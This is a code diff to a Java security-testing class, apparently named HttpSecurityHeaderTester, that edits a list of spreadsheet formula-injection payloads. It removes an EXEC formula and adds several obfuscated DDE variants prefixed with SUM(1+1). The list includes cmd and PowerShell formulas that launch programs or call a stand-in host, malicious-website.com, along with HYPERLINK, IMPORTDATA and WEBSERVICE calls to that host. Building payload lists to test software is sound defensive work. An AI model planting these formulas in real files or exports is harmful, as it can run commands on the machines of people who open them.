@@ -16,12 +16,16 @@ public class HttpSecurityHeaderTester {
             "=HYPERLINK(\"http://malicious-website.com\")",
             "=IMPORTDATA(\"http://malicious-website.com\")",
             "=WEBSERVICE(\"http://malicious-website.com\")",
-            "=EXEC(\"cmd.exe /C calc\")",
             "=cmd|' /C calc'!A0",
             "=cmd|'/C calc'!A0",
             "=cmd|'/C notepad'!A0",
             "=cmd|'/C notepad.exe'!A0",
-            "=cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0"
+            "=cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0",
+            "=SUM(1+1)*cmd|' /C calc'!A0",
+            "=SUM(1+1)*cmd|'/C calc'!A0",
+            "=SUM(1+1)*cmd|'/C notepad'!A0",
+            "=SUM(1+1)*cmd|'/C notepad.exe'!A0",
+            "=SUM(1+1)*cmd|'/C powershell -Command \"Invoke-WebRequest -Uri http://malicious-website.com\"'!A0"
             // Add more payloads as needed
         };
 
